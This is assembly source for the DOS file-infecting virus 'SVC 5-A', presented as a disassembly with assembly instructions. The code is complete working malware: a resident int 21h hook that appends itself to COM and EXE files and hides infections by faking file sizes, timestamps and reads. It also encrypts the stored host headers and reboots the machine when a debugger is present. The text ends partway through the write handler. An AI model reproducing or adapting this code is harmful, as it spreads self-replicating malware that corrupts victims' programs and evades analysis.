                .model  tiny
                .code
; SVC 5-A
; Disassembly done by Dark Angel of Phalcon/Skism
; Assemble with Tasm /m SVC5-A
                org     0

start:
                call    next
next:
                pop     si
                db      83h,0EEh,3              ; sub si,offset next
                mov     word ptr cs:[si+offset storeAX],ax
                push    es
                push    si
                xor     dx,dx
                mov     ah,84h                  ; installation check
                int     21h
                pop     si
                push    si
                cmp     dx,1990h
                jne     installvirus
                cmp     bh,byte ptr cs:[si+versionbyte]
                ja      go_exitvirus
                jc      installvirus
                push    si
                push    es
                xchg    ah,al                   ; convert ax to virus
                xor     ax,0FFFFh               ; CS
                mov     es,ax                   ; es->resident virus
                push    cs
                pop     ds
                xor     di,di
                mov     cx,begindata - start - 1; same version?
                cld
                repe    cmpsb
                pop     es
                pop     si
                jz      go_exitvirus            ; yes, exit
                jmp     reboot                  ; else reboot
go_exitvirus:
                jmp     exitvirus
installvirus:
                push    es
                xor     ax,ax
                mov     ds,ax
                les     ax,dword ptr ds:21h*4   ; save old int 21h
                mov     cs:[si+oldint21],ax     ; handler
                mov     word ptr cs:[si+oldint21+2],es
                les     ax,dword ptr ds:8*4     ; save old int 8 handler
                mov     cs:[si+oldint8],ax
                mov     word ptr cs:[si+oldint8+2],es
                pop     es
                mov     cs:[si+carrierPSP],es   ; save current PSP
                mov     ah,49h                  ; Release memory @ PSP
                int     21h
                jc      exitvirus               ; exit on error

                mov     ah,48h                  ; Find total memory size
                mov     bx,0FFFFh
                int     21h
                sub     bx,(viruslength+15)/16+1; shrink allocation for carrier
                jc      exitvirus

                mov     cx,es                   ; compute new memory
                stc                             ; block location
                adc     cx,bx
                mov     ah,4Ah                  ; Allocate memory for carrier
                int     21h

                mov     bx,(viruslength+15)/16
                stc
                sbb     es:[2],bx               ; fix high memory field in PSP
                mov     es,cx
                mov     ah,4Ah                  ; Allocate memory for virus
                int     21h

                mov     ax,es                   ; Go to virus MCB
                dec     ax
                mov     ds,ax
                mov     word ptr ds:[1],8       ; mark owner = DOS
                mov     ax,cs:[si+carrierPSP]   ; go back to carrier PSP
                dec     ax                      ; go to its MCB
                mov     ds,ax
                mov     byte ptr ds:[0],'Z'     ; mark it end of block
                push    cs
                pop     ds
                xor     di,di                   ; copy virus to high memory
                mov     cx,viruslength + 1
                cld
                rep     movsb
                xor     ax,ax
                mov     ds,ax
                cli                             ; and set up virus
                mov     word ptr ds:21h*4,offset int21
                mov     word ptr ds:21h*4+2,es  ; interrupt handlers
                mov     word ptr ds:8*4,offset int8
                mov     word ptr ds:8*4+2,es
exitvirus:
                sti
                push    cs
                pop     ds
                pop     si
                push    si
                mov     ah,byte ptr cs:[si+offset encryptval1]
                mov     dh,byte ptr cs:[si+offset encryptval2]
                add     si,offset savebuffer
                call    decrypt
                pop     si
                pop     es
                cld
                cmp     cs:[si+offset savebuffer],'ZM'
                je      returnEXE
                mov     di,100h
                push    cs
                pop     ds
                push    cs
                pop     es
                push    si
                add     si,offset savebuffer
                movsb
                movsw
                pop     si
                mov     ax,100h
                push    ax
                mov     ax,word ptr cs:[si+offset storeAX]
                retn
returnEXE:
                mov     bx,es
                add     bx,10h
                add     bx,cs:[si+savebuffer+16h]
                mov     word ptr cs:[si+jmpcs],bx
                mov     bx,cs:[si+savebuffer+14h]
                mov     word ptr cs:[si+jmpip],bx
                mov     bx,es
                mov     ds,bx
                add     bx,10h
                add     bx,cs:[si+savebuffer+0eh]
                cli
                mov     ss,bx
                mov     sp,cs:[si+savebuffer+10h]
                sti
                mov     ax,word ptr cs:[si+offset storeAX]
                db      0EAh                    ; jmp far ptr
jmpip           dw      0
jmpcs           dw      0

int21:
                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                mov     word ptr cs:int21command,ax
                cmp     word ptr cs:int21command,4B03h ; load/no PSP
                je      _load_noexecute
                cmp     word ptr cs:int21command,4B01h ; load/no execute
                je      _load_noexecute
                cmp     word ptr cs:int21command,4B00h ; load/execute
                je      _load_execute
                cmp     ah,3Dh                  ; handle open
                je      _handleopen
                cmp     ah,3Eh                  ; handle close
                je      _handleclose
                cmp     ah,40h                  ; handle write
                je      _handlewrite
                cmp     ah,4Ch                  ; terminate
                je      _terminate
                jmp     short exitint21
                nop
_terminate:
                jmp     terminate
_handlewrite:
                jmp     handlewrite
_load_noexecute:
                jmp     load_noexecute
_handleclose:
                jmp     handleclose
_handlecreate:
                jmp     handlecreate
_load_execute:
                jmp     load_execute
_handleopen:
                jmp     handleopen
_FCBfindfirstnext:
                jmp     FCBfindfirstnext
_ASCIIfindfirstnext:
                jmp     ASCIIfindfirstnext
_handlegoEOF:
                jmp     handlegoEOF
_handleopen2:
                jmp     handleopen2
_handleread:
                jmp     handleread
_getsetfiletime:
                jmp     getsetfiletime

return:
                retn

load_execute_exit:
                call    restoreint24and23
                jmp     short exitint21
                nop

restoreint24and23:
                xor     ax,ax
                mov     ds,ax
                mov     ax,cs:oldint24
                mov     ds:24h*4,ax
                mov     ax,cs:oldint24+2
                mov     word ptr ds:24h*4+2,ax
                mov     ax,cs:oldint23
                mov     ds:23h*4,ax
                mov     ax,cs:oldint23+2
                mov     word ptr ds:23h*4+2,ax
                retn

exitint21:
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                cmp     ah,3Ch                  ; handlecreate
                je      _handlecreate
                cmp     ah,83h                  ; installation check for
                je      old_installation_check  ; other versions of SVC
                cmp     ah,84h                  ; installation check for
                je      installation_check      ; this version of SVC
                cmp     ah,4Eh                  ; find first?
                je      _ASCIIfindfirstnext
                cmp     ah,4Fh                  ; find next?
                je      _ASCIIfindfirstnext
                cmp     ah,11h                  ; find first
                je      _FCBfindfirstnext
                cmp     ah,12h                  ; find next
                je      _FCBfindfirstnext
                cmp     ax,4202h                ; go EOF
                je      _handlegoEOF
                cmp     ah,3Dh                  ; handle open
                je      _handleopen2
                cmp     ah,3Fh                  ; handle read
                je      _handleread
                cmp     ah,57h                  ; get/set file time
                je      _getsetfiletime
                popf                            ; chain to original int
                jmp     dword ptr cs:oldint21   ; 21h handler

callint21:
                cli
                pushf
                call    dword ptr cs:oldint21
                retn

installation_check:
                popf
                mov     bh,cs:versionbyte
                mov     ax,cs
                xor     ax,0FFFFh
                xchg    ah,al
common_installation_check_return:
                mov     dx,1990h
                iret

old_installation_check:
                popf
                jmp     short common_installation_check_return

popdsdx_return:
                pop     dx
                pop     ds
                jmp     return

load_execute:
                call    check_chkdsk
                call    infectdsdx
                jmp     load_execute_exit

infectdsdx:
                call    setint24and23
                jmp     short infectdsdx_continue
                nop

setint24and23:
                xor     ax,ax
                mov     es,ax
                les     ax,dword ptr es:24h*4
                mov     cs:oldint24,ax
                mov     cs:oldint24+2,es
                xor     ax,ax
                mov     es,ax
                les     ax,dword ptr es:23h*4
                mov     cs:oldint23,ax
                mov     cs:oldint23+2,es
                xor     ax,ax
                mov     es,ax
                mov     word ptr es:24h*4,offset int24
                mov     word ptr es:24h*4+2,cs
                mov     word ptr es:23h*4,offset int23
                mov     word ptr es:23h*4+2,cs
                retn

infectdsdx_continue:
                push    ds
                push    dx
                cmp     byte ptr cs:tickcount,3Ch ; don't infect too early
                jb      popdsdx_return          ; after previous one
                mov     ax,4300h                ; get file attributes
                call    callint21
                jc      popdsdx_return
                mov     cs:fileattr,cx
                and     cl,0FEh                 ; turn off r/o bit
                mov     ax,4301h                ; and reset file attributes
                call    callint21
                jc      popdsdx_return
                mov     cx,cs:fileattr
                and     cl,4                    ; test cl,4
                cmp     cl,4                    ; check system attribute
                je      infecthandle_exit       ; exit if set
                mov     ax,3D02h                ; open file read/write
                call    callint21
                jc      infecthandle_exit
                mov     bx,ax                   ; handle to bx
                push    dx                      ; save file name pointer
                mov     ax,5700h                ; get file time/date
                call    callint21
                pop     dx
                and     cx,1Eh                  ; check if seconds = 60
                cmp     cx,1Eh                  ; (infection marker)
                jne     infect_dsdx_checkmo     ; continue if not so marked
                jmp     short infecthandle_alreadyinfected
                nop
infect_dsdx_checkmo:
                call    check_command_com
                jnc     infecthandle
                jmp     short infecthandle_alreadyinfected
                nop

check_command_com:
                cld
                mov     si,dx
check_command_com_loop:
                lodsw
                cmp     ax,'MM'                 ; COMMAND.COM?
                je      check_command_com_yes
                cmp     ax,'mm'
                je      check_command_com_yes
                cmp     ax,'MB'                 ; IBMBIO/IBMDOS?
                je      check_command_com_yes
                cmp     ax,'mb'
                je      check_command_com_yes
                cmp     ah,0
                je      check_command_com_no
                dec     si
                jmp     short check_command_com_loop
check_command_com_yes:
                stc
                retn
check_command_com_no:
                clc
                retn

infecthandle_exit:
                jmp     popdsdx_return
infecthandle:
                cmp     bx,5                    ; check if handle too
                jb      infecthandle_exit       ; small (predefined)
                call    checkifinfected
                jnc     infecthandle_alreadyinfected
                call    infect_handle
infecthandle_alreadyinfected:
                mov     ah,3Eh                  ; Close file
                call    callint21
                pop     dx
                pop     ds
                jc      infecthandle_exit2
                mov     ax,4301h                ; restore file attributes
                mov     cx,cs:fileattr
                call    callint21
infecthandle_exit2:
                jmp     return

infect_handle_exit:
                jmp     infect_handle_error
infect_handle:
                mov     ax,5700h                ; get file time/date
                call    callint21
                mov     cs:filetime,cx
                mov     cs:filedate,dx
                xor     cx,cx
                xor     dx,dx
                mov     ax,4200h                ; go to start of file
                call    callint21
                push    cs
                pop     ds
                mov     cx,18h                  ; read header
                mov     dx,offset savebuffer
                mov     ah,3Fh
                call    callint21
                jc      infect_handle_exit
                push    cs
                pop     es
                push    cs
                pop     ds
                mov     si,offset savebuffer    ; copy to work buffer
                mov     di,offset workbuffer
                mov     cx,18h
                cld
                rep     movsb
                mov     ax,2C00h
                call    callint21
                mov     byte ptr cs:encryptval2,dh
                mov     byte ptr cs:encryptval1,dl
                mov     ah,dl
                mov     si,offset savebuffer
                call    decrypt
                cmp     cs:workbuffer,'ZM'      ; check if EXE
                je      infect_handle_EXE
                mov     cs:workbuffer,0E9h      ; encode the jmp
                xor     cx,cx
                xor     dx,dx
                mov     ax,4202h                ; get file size
                call    callint21
                cmp     dx,0
                jne     infect_handle_exit
                cmp     ax,viruslength
                jb      infect_handle_exit
                cmp     ax,0EDE1h               ; check if too large
                jae     infect_handle_exit
                sub     ax,3                    ; adjust size to jmp location
                mov     word ptr cs:workbuffer+1,ax
                call    writevirusandheader     ; write virus to file
                jmp     infect_handle_finish

writevirusandheader:
                push    cs
                pop     ds
                xor     dx,dx
                mov     cx,viruslength
                mov     ah,40h                  ; concatenate virus
                call    callint21
                jc      writevirusandheader_exit
                cmp     ax,viruslength
                jne     writevirusandheader_exit
                xor     cx,cx
                xor     dx,dx
                mov     ax,4200h                ; go to start of file
                call    callint21
                jc      writevirusandheader_exit
                mov     dx,offset workbuffer    ; write new header to file
                mov     ah,40h
                mov     cx,18h
                call    callint21
                retn
writevirusandheader_exit:
                stc
                retn

infect_handle_EXE:
                xor     cx,cx                   ; go to end of file
                xor     dx,dx
                mov     ax,4202h
                call    callint21
                push    dx                      ; save file size
                push    ax
                mov     si,ax
                xor     ax,ax
                xchg    ax,dx
                mov     di,1000h
                mul     di
                mov     dx,ax
                mov     ax,si
                mov     si,dx
                xor     dx,dx
                mov     di,10h                  ; convert to paragraphs
                div     di
                add     ax,si
                xchg    ax,dx
                sub     dx,cs:workbuffer+8      ; subtract header size
                mov     word ptr cs:workbuffer+16h,dx ; insert new initial
                mov     word ptr cs:workbuffer+14h,ax ; CS:IP (end of file)
                pop     ax
                pop     dx
                add     ax,viruslength          ; calculate new image
                adc     dx,0                    ; size mod 512 and div 512
                mov     di,200h
                div     di
                cmp     dx,0
                je      infect_handle_EXE_nofixup
                add     ax,1                    ; pagelength fixup
infect_handle_EXE_nofixup:
                mov     cs:workbuffer+4,ax
                mov     cs:workbuffer+2,dx
                mov     ds,word ptr cs:workbuffer+16h ; insert new SS:SP
                mov     word ptr cs:workbuffer+0Eh,ds
                mov     ax,word ptr cs:workbuffer+14h
                add     ax,17D7h
                mov     word ptr cs:workbuffer+10h,ax
                call    writevirusandheader     ; write virus to file
                jmp     short infect_handle_finish
                nop
infect_handle_error:
                stc
infect_handle_finish:
                mov     ax,5701h                ; restore file time/date
                mov     cx,cs:filetime
                mov     dx,cs:filedate
                jc      infect_handle_noreset
                and     cx,0FFFEh               ; but set seconds to
                or      cx,1Eh                  ; 60
                mov     byte ptr cs:tickcount,0 ; reset tickcount
infect_handle_noreset:
                call    callint21
                retn

int23:
                iret
int24:
                mov     al,3
                iret

load_noexecute_exit:
                jmp     load_noexecute_closeexit
load_noexecute:
                call    setint24and23
                push    ds
                push    dx
                mov     ax,4300h                ; get file attributes
                call    callint21
                jc      load_noexecute_exit
                mov     cs:fileattr,cx
                and     cl,0FEh                 ; turn off r/o bit
                mov     ax,4301h                ; reset attributes
                call    callint21
                jc      load_noexecute_exit
                mov     ax,3D02h                ; open file read/write
                call    callint21
                jc      load_noexecute_exit
                mov     bx,ax                   ; handle to bx
                call    checkifinfected
                jc      load_noexecute_exit
                jmp     short load_noexecute_disinfect
                nop
checkifinfected_exit:
                stc                             ; mark infected
                retn                            ; and exit

checkifinfected:
                mov     ax,5700h                ; get file time/date
                call    callint21
                mov     cs:filedate,dx
                mov     cs:filetime,cx
                and     cx,1Fh
                cmp     cx,1Eh
                jne     checkifinfected_exit
                xor     cx,cx
                xor     dx,dx
                mov     ax,4202h                ; go to end of file
                call    callint21
                jc      checkifinfected_exit
                mov     cs:filesizelo,ax        ; save filesize
                mov     cs:filesizehi,dx
                sub     ax,endvirus - infection_marker
                sbb     dx,0
                mov     cx,ax
                xchg    cx,dx
                mov     ax,4200h                ; rewind to infection
                call    callint21               ; marker
                jc      checkifinfected_exit
                push    cs
                pop     ds
                mov     ah,3Fh                  ; read file
                mov     cx,3
                mov     dx,offset savebuffer
                call    callint21
                jc      checkifinfected_exit
                push    cs
                pop     es
                mov     si,offset savebuffer    ; check for infection
                mov     di,offset infection_marker
                mov     cx,3                    ; marker
                repne   cmpsb
                jnz     checkifinfected_exit
                clc                             ; mark not infected
                retn                            ; and exit

load_noexecute_disinfect:
                call    disinfect
                jmp     load_noexecute_closeexit

disinfect_exit:
                jmp     disinfect_error
disinfect:
                mov     dx,cs:filesizelo
                mov     cx,cs:filesizehi
                sub     dx,75h                  ; go to savebuffer
                nop
                sbb     cx,0
                mov     ax,4200h
                call    callint21
                jc      disinfect_exit
                jmp     short disinfect_file
                nop

                jmp     load_noexecute_closeexit
disinfect_file:
                push    cs
                pop     ds
                mov     ah,3Fh                  ; Read carrier's
                mov     cx,18h                  ; original header
                mov     dx,offset savebuffer
                push    cs
                pop     ds
                call    callint21
                jc      disinfect_exit
                mov     dx,cs:filesizelo        ; go to decryption
                mov     cx,cs:filesizehi        ; values
                sub     dx,endvirus - encryptval1
                nop
                sbb     cx,0
                mov     ax,4200h
                call    callint21
                mov     dx,offset encryptval1
                mov     ah,3Fh                  ; read decryption values
                mov     cx,2
                call    callint21
                mov     si,offset savebuffer
                mov     ah,byte ptr cs:encryptval1
                mov     dh,byte ptr cs:encryptval2
                call    decrypt                 ; decrypt old header
                xor     cx,cx
                xor     dx,dx
                mov     ax,4200h
                call    callint21
                jc      disinfect_error
                mov     ah,40h                  ; Write old header to
                mov     cx,18h                  ; file
                mov     dx,offset savebuffer
                call    callint21
                jc      disinfect_error
                mov     dx,cs:filesizelo
                mov     cx,cs:filesizehi
                sub     dx,viruslength
                sbb     cx,0                    ; go to end of carrier
                mov     ax,4200h                ; file and
                call    callint21
                jc      disinfect_error
                mov     ah,40h                  ; truncate file
                xor     cx,cx                   ; at current position
                call    callint21
                jc      disinfect_error
                mov     ax,5701h                ; restore file time/date
                mov     dx,cs:filedate
                mov     cx,cs:filetime
                xor     cx,1Fh
                call    callint21
                retn
disinfect_error:
                stc                             ; mark error
                retn

load_noexecute_closeexit:
                mov     ah,3Eh                  ; Close file and
                call    callint21
                mov     ax,4301h                ; restore attributes
                mov     cx,offset fileattr      ; BUG!!!
                pop     dx
                pop     ds
                call    callint21
                call    restoreint24and23
                jmp     exitint21

FCBfindfirstnext:
                call    dword ptr cs:oldint21   ; prechain
                pushf
                pop     cs:returnFlags
                cmp     al,0FFh
                je      FCBfindfirstnext_exit
                cmp     cs:chkdskflag,0
                jne     FCBfindfirstnext_exit
                push    ax
                push    bx
                push    cx
                push    dx
                push    es
                push    ds
                mov     ah,2Fh                  ; Get DTA
                call    callint21
                cmp     word ptr es:[bx],0FFh   ; extended FCB?
                jne     FCBfindfirstnext_noextendedFCB
                add     bx,8                    ; convert if so
FCBfindfirstnext_noextendedFCB:
                mov     ax,es:[bx+16h]
                and     ax,1Fh                  ; check if seconds = 60
                cmp     ax,1Eh
                jne     FCBfindfirstnext_notinfected
                xor     word ptr es:[bx+16h],1Fh; fix seconds field
                sub     word ptr es:[bx+1Ch],viruslength
                sbb     word ptr es:[bx+1Eh],0  ; shrink size
FCBfindfirstnext_notinfected:
                pop     ds
                pop     es
                pop     dx
                pop     cx
                pop     bx
                pop     ax
FCBfindfirstnext_exit:
                pop     cs:storesIP
                pop     cs:storesCS
                popf
                push    cs:returnFlags
                push    cs:storesCS
                push    cs:storesIP
                iret

ASCIIfindfirstnext:
                call    dword ptr cs:oldint21   ; prechain
                pushf
                pop     cs:returnFlags
                jc      ASCIIfindfirstnext_exit
                cmp     cs:chkdskflag,0
                jne     ASCIIfindfirstnext_exit
                push    ax
                push    bx
                push    cx
                push    dx
                push    es
                push    ds
                mov     ah,2Fh                  ; Get DTA
                call    callint21
                mov     ax,es:[bx+16h]          ; get file time
                and     ax,1Fh                  ; to check if file
                cmp     ax,1Eh                  ; infected
                jne     ASCIIfindfirstnext_notinfected
                xor     word ptr es:[bx+16h],1Fh        ; hide time change
                sub     word ptr es:[bx+1Ah],viruslength; and file length
                sbb     word ptr es:[bx+1Ch],0          ; change
ASCIIfindfirstnext_notinfected:
                pop     ds
                pop     es
                pop     dx
                pop     cx
                pop     bx
                pop     ax
ASCIIfindfirstnext_exit:
                pop     cs:storesIP
                pop     cs:storesCS
                popf
                push    cs:returnFlags
                push    cs:storesCS
                push    cs:storesIP
                iret
handleopen:
                call    check_infectok
                jnc     handleopen_continue
                jmp     exitint21

check_infectok:
                cld
                mov     si,dx
                lodsw
                cmp     ah,':'
                jne     check_infectok_nodrive
                cmp     al,'a'                  ; make sure not floppy
                je      check_infectok_exit
                cmp     al,'A'
                je      check_infectok_exit
                cmp     al,'B'
                jb      check_infectok_exit     ; BUG
                cmp     al,'b'
                je      check_infectok_exit
                jmp     short check_extension
                nop
check_infectok_exit:
                jmp     short check_extension_notok
                nop
check_infectok_nodrive:
                mov     ah,19h                  ; get default drive
                call    callint21
                cmp     al,2                    ; make sure not floppy
                jae     check_extension
                jmp     short check_extension_notok
                db      90h

check_extension:
                cld
                mov     si,dx
check_extension_findextension:
                lodsb
                cmp     al,'.'
                je      check_extension_foundextension
                cmp     al,0
                jne     check_extension_findextension
                jmp     short check_extension_notok
                db      90h
check_extension_foundextension:
                lodsw
                cmp     ax,'OC'
                je      check_extension_checkcom
                cmp     ax,'oc'
                je      check_extension_checkcom
                cmp     ax,'XE'
                je      check_extension_checkexe
                cmp     ax,'xe'
                je      check_extension_checkexe
                jmp     short check_extension_notok
                db      90h
check_extension_checkcom:
                lodsb
                cmp     al,'M'
                je      check_extension_ok
                cmp     al,'m'
                je      check_extension_ok
                jmp     short check_extension_notok
                db      90h
check_extension_checkexe:
                lodsb
                cmp     al,'E'
                je      check_extension_ok
                cmp     al,'e'
                je      check_extension_ok
                jmp     short check_extension_notok
                db      90h
check_extension_ok:
                clc
                retn
check_extension_notok:
                stc
                retn

handleopen_continue:
                call    infectdsdx
                call    restoreint24and23
                jmp     exitint21
handlecreate:
                mov     word ptr cs:storess,ss  ; preserve ss and sp
                mov     word ptr cs:storesp,sp
                call    dword ptr cs:oldint21
                cli
                mov     ss,word ptr cs:storess
                mov     sp,word ptr cs:storesp
                sti
                pop     cs:returnFlags          ; save return flags
                pushf
                push    ax
                push    bx
                push    cx
                push    ds
                push    es
                push    si
                push    di
                jc      handlecreate_exit
                push    dx
                push    ax
                call    check_extension
                pop     ax
                pop     dx
                jc      handlecreate_exit
                push    ax
                call    check_command_com
                pop     ax
                jc      handlecreate_exit
                mov     cs:handletoinfect,ax    ; save handle to infect
                                                ; upon close
handlecreate_exit:
                pop     di
                pop     si
                pop     es
                pop     ds
                pop     cx
                pop     bx
                pop     ax
                jmp     exit_replaceflags
handleclose_exit:
                mov     cs:filehand,0
                jmp     exitint21

handleclose:
                cmp     bx,0
                jne     handleclose_continue
                jmp     exitint21
handleclose_continue:
                cmp     bx,cs:handletoinfect
                je      handleclose_infect
                cmp     bx,cs:filehand
                je      handleclose_exit
                jmp     exitint21
handleclose_infect:
                mov     ah,45h                  ; Duplicate file handle
                call    callint21
                jc      handleclose_infect_exit
                xchg    ax,bx
                call    setint24and23
                call    handleclose_infecthandle
                call    restoreint24and23
handleclose_infect_exit:
                mov     cs:handletoinfect,0
                jmp     exitint21

handleclose_infecthandle:
                push    ds
                push    dx
                jmp     infecthandle

int8:
                push    ax
                push    ds
                pushf
                cmp     byte ptr cs:tickcount,0FFh ; don't "flip" tickcount
                je      int8checkint1
                inc     cs:tickcount            ; one mo tick
int8checkint1:
                xor     ax,ax
                mov     ds,ax
                cmp     word ptr ds:1*4,offset int1 ; int 1 changed?
                jne     int8setint1                 ; fix it if so
                mov     ax,cs
                cmp     word ptr ds:1*4+2,ax
                jne     int8setint1
int8checkint3:
                cmp     word ptr ds:3*4,offset int3 ; int 3 changed?
                jne     int8setint3                 ; fix it if so
                mov     ax,cs
                cmp     word ptr ds:3*4+2,ax
                jne     int8setint3
exitint8:
                popf
                pop     ds
                pop     ax
                jmp     dword ptr cs:oldint8

int8setint1:
                push    es
                les     ax,dword ptr ds:1*4
                mov     cs:oldint1,ax
                mov     word ptr cs:oldint1+2,es
                mov     word ptr ds:1*4,offset int1
                mov     word ptr ds:1*4+2,cs
                pop     es
                jmp     short int8checkint3
int8setint3:
                push    es
                les     ax,dword ptr ds:3*4
                mov     cs:oldint3,ax
                mov     word ptr cs:oldint3+2,es
                mov     word ptr ds:3*4,offset int3
                mov     word ptr ds:3*4+2,cs
                pop     es
                jmp     short exitint8

int3:                                           ; reboot if debugger
                push    bp                      ; is active
                push    ax
                mov     bp,sp
                add     bp,6
                mov     bp,[bp]
                mov     ax,cs
                cmp     bp,ax
                pop     ax
                pop     bp
                jz      reboot
                jmp     dword ptr cs:oldint3

exitint1:
                iret

int1:
                push    bp                      ; this routine doesn't
                push    ax                      ; do very much that's
                mov     bp,sp                   ; meaningful
                add     bp,6
                mov     bp,[bp]
                mov     ax,cs
                cmp     bp,ax
                pop     ax
                pop     bp
                jz      exitint1
                jmp     dword ptr cs:oldint1
reboot:
                db      0EAh                    ; jmp F000:FFF0
                db      0F0h, 0FFh, 0, 0F0h     ; (reboot)

decrypt:
                push    bx
                push    es
                call    decrypt_next
decrypt_next:
                pop     bx
                mov     byte ptr cs:[bx+16h],32h ; inc sp -> xor al,ah
                nop
                mov     byte ptr cs:[bx+19h],2   ; add dh,ah -> add ah,dh
                nop
                push    ds
                pop     es
                mov     di,si
                mov     cx,18h
                cld
decrypt_loop:
                lodsb
                db      0FFh, 0C4h              ; inc sp
                stosb
                db      0, 0E6h                 ; add dh,ah
                loop    decrypt_loop

                mov     byte ptr cs:[bx+16h],0FFh ; change back to inc sp
                mov     byte ptr cs:[bx+19h],0    ; and add dh,ah -- why?
                pop     es
                pop     bx
                retn

handlegoEOF:
                popf
                cmp     cs:filehand,bx          ; currently working on this?
                jne     handlegoEOFexit
                mov     cs:tempstoreDX,dx       ; save offset from EOF
                mov     cs:tempstoreCX,cx
                xor     cx,cx
                xor     dx,dx
                call    callint21               ; go to EOF
                sub     ax,viruslength          ; shrink to carrier size
                sbb     dx,0
                mov     cx,ax
                xchg    cx,dx
                add     dx,cs:tempstoreDX       ; add offset from carrier
                adc     cx,cs:tempstoreCX       ; EOF
                mov     ax,4200h                ; and do it
handlegoEOFexit:
                jmp     dword ptr cs:oldint21

handleopen2:
                call    dword ptr cs:oldint21
                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    di
                push    si
                push    ds
                push    es
                jc      handleopen2_exit
                cmp     cs:filehand,0
                jne     handleopen2_exit
                push    ax
                mov     bx,ax
                call    checkifinfected
                pop     ax
                jc      handleopen2_alreadyinfected
                mov     cs:filehand,ax          ; save file handle for
                mov     bx,ax                   ; later use
                mov     ax,4202h                ; go to end of file
                xor     cx,cx                   ; to find file size
                xor     dx,dx
                call    callint21
                sub     ax,viruslength          ; calculate carrier
                sbb     dx,0                    ; size and store it
                mov     cs:carrierEOFhi,dx
                mov     cs:carrierEOFlo,ax
handleopen2_alreadyinfected:
                xor     cx,cx                   ; go to start of file
                xor     dx,dx
                mov     ax,4200h
                call    callint21
handleopen2_exit:
                pop     es
                pop     ds
                pop     si
                pop     di
                pop     dx
                pop     cx
                pop     bx
                pop     ax
exit_replaceflags:
                popf
                pop     cs:storesIP
                pop     cs:storesCS
                pop     cs:returnFlags
                pushf
                push    cs:storesCS
                push    cs:storesIP
                iret
handleread_exit:
                jmp     handleread__exit

handleread:
                call    dword ptr cs:oldint21   ; prechain
                pushf
                push    ax
                push    cx
                push    dx
                push    ds
                push    di
                push    si
                push    es
                jc      handleread_exit         ; exit on error
                cmp     cs:filehand,0
                je      handleread_exit
                cmp     cs:filehand,bx
                jne     handleread_exit
                mov     cs:bufferoff,dx
                mov     cs:bufferseg,ds
                mov     cs:bytesread,ax
                xor     cx,cx                   ; get current file position
                xor     dx,dx
                mov     ax,4201h
                call    callint21
                jc      handleread_exit
                sub     ax,cs:bytesread         ; find pre-read location
                sbb     dx,0                    ; to see if need to
                mov     cs:origposhi,dx         ; redirect it
                mov     cs:origposlo,ax
                mov     ax,4202h                ; go to end of file
                xor     cx,cx
                xor     dx,dx
                call    callint21
                sub     ax,viruslength
                sbb     dx,0
                mov     cs:carrierEOFlo,ax
                mov     cs:carrierEOFhi,dx
                cmp     cs:origposhi,0          ; check if read was
                jne     handleread_notinheader  ; from the header
                cmp     cs:origposlo,18h
                jb      handleread_inheader
handleread_notinheader:
                mov     cx,cs:origposhi         ; check if read extended
                mov     dx,cs:origposlo         ; into the virus
                add     dx,cs:bytesread
                adc     cx,0
                cmp     cx,cs:carrierEOFhi
                jb      handleread_notinvirus
                ja      handleread_invirus
                cmp     dx,cs:carrierEOFlo
                ja      handleread_invirus
handleread_notinvirus:
                mov     cx,cs:origposhi         ; return to proper file
                mov     dx,cs:origposlo         ; position
                add     dx,cs:bytesread
                adc     cx,0
                mov     ax,4200h
                call    callint21
handleread__exit:
                pop     es
                pop     si
                pop     di
                pop     ds
                pop     dx
                pop     cx
                pop     ax
                jmp     exit_replaceflags
handleread_invirus:
                jmp     handleread__invirus
handleread_inheader:
                cmp     cs:bytesread,0
                je      handleread_notinheader
                mov     cx,cs:carrierEOFhi
                mov     dx,cs:carrierEOFlo
                add     dx,offset savebuffer
                adc     cx,0
                mov     ax,4200h
                call    callint21
                jc      handleread_notinheader
                push    ds
                pop     es
                push    cs
                pop     ds
                mov     dx,offset savebuffer
                mov     ah,3Fh                  ; Read header
                mov     cx,18h
                call    callint21
                jc      handleread_notinheader
                cmp     ax,18h
                jne     handleread_notinheader
                mov     cx,cs:carrierEOFhi      ; go to decryption values
                mov     dx,cs:carrierEOFlo
                add     dx,offset encryptval1
                adc     cx,0
                mov     ax,4200h
                call    callint21
                mov     ah,3Fh                  ; read decryption values
                mov     cx,2
                mov     dx,offset encryptval1
                call    callint21
                jc      handleread_inheader_error
                mov     si,offset savebuffer
                mov     ah,byte ptr cs:encryptval1
                mov     dh,byte ptr cs:encryptval2
                call    decrypt
                mov     cx,cs:origposlo
                neg     cx
                add     cx,18h
                cmp     cx,cs:bytesread
                jb      handleread_inheader_noadjust
                mov     cx,cs:bytesread
handleread_inheader_noadjust:
                mov     si,offset savebuffer    ; copy previously read
                add     si,cs:origposlo         ; stuff if necessary
                mov     di,cs:bufferoff
                mov     es,cs:bufferseg
                cld
                cmp     cx,0
                je      handleread_inheader_nomove
                rep     movsb
handleread_inheader_nomove:
                jmp     handleread_notinheader
handleread_inheader_error:
                jmp     handleread_notinheader
handleread__invirus:
                mov     cx,cs:origposhi
                cmp     cx,cs:carrierEOFhi
                ja      handleread__invirus_gocarrierEOF
                jc      handleread__invirus_readpart
                mov     cx,cs:origposlo
                cmp     cx,cs:carrierEOFlo
                jb      handleread__invirus_readpart
handleread__invirus_gocarrierEOF:
                mov     cx,cs:origposhi
                mov     dx,cs:origposlo
                mov     ax,4200h
                call    callint21
                xor     ax,ax
handleread__invirus_exit:
                pop     es
                pop     si
                pop     di
                pop     ds
                pop     dx
                pop     cx
                pop     cs:returnFlags
                jmp     exit_replaceflags
handleread__invirus_readpart:
                mov     cx,cs:carrierEOFhi      ; read portion of
                mov     dx,cs:carrierEOFlo      ; file up to virus
                mov     ax,4200h
                call    callint21
                sub     ax,cs:origposlo
                jmp     short handleread__invirus_exit
handlewrite:
                cmp     bx,0
                je      handlewrite_exit
                cmp     bx,cs:filehand
                jne     handlewrite_exit
                mov     ax,4201h                ; get current position
                xor     cx,cx                   ; in the file
                xor     dx,dx
                call    callint21
                jc      handlewrite_exit
                mov     cs:curposlo,ax
                mov     cs:curposhi,dx
                mov     ax,4202h                ; go to end of file
                xor     cx,cx                   ; to find the filesize
                xor     dx,dx
                call    callint21
                mov     cs:filesizelo,ax
                mov     cs:filesizehi,dx
                call    disinfect               ; disinfect the file
                jc      handlewrite_done
                cmp     cs:handletoinfect,0
                jne     handlewrite_done
